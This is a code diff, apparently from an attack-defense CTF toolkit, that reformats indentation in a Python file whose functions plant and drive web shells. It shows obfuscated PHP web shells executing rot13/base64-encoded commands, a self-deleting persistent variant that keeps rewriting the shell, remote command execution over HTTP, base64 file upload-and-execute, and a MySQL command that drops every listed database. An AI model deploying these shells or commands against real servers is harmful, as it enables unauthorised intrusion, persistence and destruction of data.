@@ -77,7 +77,7 @@ def dump_info(info,target="",load_script=""):
 
 def debug_print(msg):
     if debug:
-	Log.context(msg) 
+        Log.context(msg) 
    
 def res_filter(res):
     index_1 = res.find(cmd_prefix) + len(cmd_prefix)
@@ -86,7 +86,7 @@ def res_filter(res):
         res = res[index_1:index_2]
     else:
         dump_warning("can not find the cmd_split in your output")
-	return "\nerror happen\n"
+        return "\nerror happen\n"
     return res
 
 def random_ua():
@@ -103,23 +103,23 @@ def shell_hash(target,target_port):
 def execute_shell(target,target_port,cmd):
     shell_name,shell_arg = shell_hash(target,target_port)
     if shell_type==1 or shell_type==2:
-	c_1 = "system"
-	c_2 = cmd + ";"
-	c_1 = rot13(base64.b64encode(c_1))
-	c_2 = rot13(base64.b64encode(c_2))
-	c_1 = c_1.replace('+','%2B')
-	c_2 = c_2.replace('+','%2B')
-	data = "a=" + c_1 + "&" + "b=" + c_2 + "&" + "hash=" + shell_arg
-	debug_print("payload => " + data)
-	try:
-	    res = http("post",target,target_port,shell_path + "/" +  shell_name ,data,headers)
-	except Exception,e:
-	    dump_error(e,target,"function.py execute_shell")
+        c_1 = "system"
+        c_2 = cmd + ";"
+        c_1 = rot13(base64.b64encode(c_1))
+        c_2 = rot13(base64.b64encode(c_2))
+        c_1 = c_1.replace('+','%2B')
+        c_2 = c_2.replace('+','%2B')
+        data = "a=" + c_1 + "&" + "b=" + c_2 + "&" + "hash=" + shell_arg
+        debug_print("payload => " + data)
+        try:
+            res = http("post",target,target_port,shell_path + "/" +  shell_name ,data,headers)
+        except Exception,e:
+            dump_error(e,target,"function.py execute_shell")
             # execute shell timeout
             if 'timed out' in str(e):
                 return "timeout"
-	    return "error occurs"
-	return res
+            return "error occurs"
+        return res
 
 def check_shell(target,target_port,cmd):
     shell_name,shell_arg = shell_hash(target,target_port)
@@ -127,27 +127,27 @@ def check_shell(target,target_port,cmd):
     if res == 'timeout':
         return res
     if "hell0W0r1d" in res:
-	return True
+        return True
     return False    
 
 def visit_shell(target,target_port,cmd):
     shell_name,shell_arg = shell_hash(target,target_port)
     if headers.has_key('Content-Length'):
-	del(headers['Content-Length'])
+        del(headers['Content-Length'])
     res = requests.get("http://" + target + ":" + str(target_port) + shell_path + "/"  + shell_name,timeout=timeout,headers=headers)
     if res.status_code==200:
-	res.close()
-	return True
+        res.close()
+        return True
     res.close()
     return False
 
 def visit_url(target,target_port,url):
     if headers.has_key('Content-Length'):
-	del(headers['Content-Length'])
+        del(headers['Content-Length'])
     res = requests.get("http://" + target + ":" + str(target_port) + url,timeout=timeout,headers=headers)
     if res.status_code==200:
-	res.close()
-	return True
+        res.close()
+        return True
     res.close()
     return False
 
@@ -155,8 +155,8 @@ def upload_and_execute(target,target_port,cmd):
     global U_A_E_flag, upload_file_name, executor
     if not U_A_E_flag:
         upload_file_name = raw_input('The file to upload:')
-	executor = raw_input('The executor:')
-	U_A_E_flag = 1
+        executor = raw_input('The executor:')
+        U_A_E_flag = 1
     contents = open("./script/" + upload_file_name).read()
     contents = base64.b64encode(contents)
     cmd = '/bin/echo %s | /usr/bin/base64 -d | /bin/cat > %s/%s'%(contents , shell_absolute_path , upload_file_name)
@@ -167,19 +167,19 @@ def upload_and_execute(target,target_port,cmd):
 def generate_shell(target,target_port,cmd,shell_type=2):
     shell_name,shell_arg = shell_hash(target,target_port)
     if shell_type==1: 
-	shell = '<?php if($_REQUEST[hash]=="%s"){$c_1 = base64_decode(str_rot13($_REQUEST[a]));$c_2 = base64_decode(str_rot13($_REQUEST[b]));$c_1($c_2);}?>'%shell_arg
+        shell = '<?php if($_REQUEST[hash]=="%s"){$c_1 = base64_decode(str_rot13($_REQUEST[a]));$c_2 = base64_decode(str_rot13($_REQUEST[b]));$c_1($c_2);}?>'%shell_arg
     if shell_type==2:
-	shell = """<?php
-	ignore_user_abort(true);
+        shell = """<?php
+        ignore_user_abort(true);
         set_time_limit(0);
-	$file = "%s";
+        $file = "%s";
         $shell = '<?php if($_REQUEST[hash]=="%s"){$c_1 = base64_decode(str_rot13($_REQUEST[a]));$c_2 = base64_decode(str_rot13($_REQUEST[b]));$c_1($c_2);}?>';
-	unlink(__FILE__);
+        unlink(__FILE__);
         while (TRUE) {{
-	if (file_get_contents($file)!==$shell) {{ file_put_contents($file, $shell); }}
+        if (file_get_contents($file)!==$shell) {{ file_put_contents($file, $shell); }}
         usleep(5);
-	}}
-	?>"""%(shell_name,shell_arg)
+        }}
+        ?>"""%(shell_name,shell_arg)
     return shell_name,shell,base64.b64encode(shell)
 
 def get_shell(target,target_port,cmd):
@@ -204,11 +204,11 @@ def rm_file(target,target_port,cmd):
 def rm_db(target,target_port,cmd):
     cmd = "/usr/bin/mysql -h localhost -u%s %s -e '"%(db_user,my_db_passwd)
     for db in db_name:
-	cmd += "drop database %s;"%db
+        cmd += "drop database %s;"%db
     cmd += "'"
     debug_print(cmd)
-    return cmd	
-	
+    return cmd  
+        
 def mysql_get_shell(target,target_port,cmd):
     # We use the normal shell, which can not be deleted by the defalut user
     shell_name,shell,encode_shell = generate_shell(target,target_port,cmd,shell_type=1)
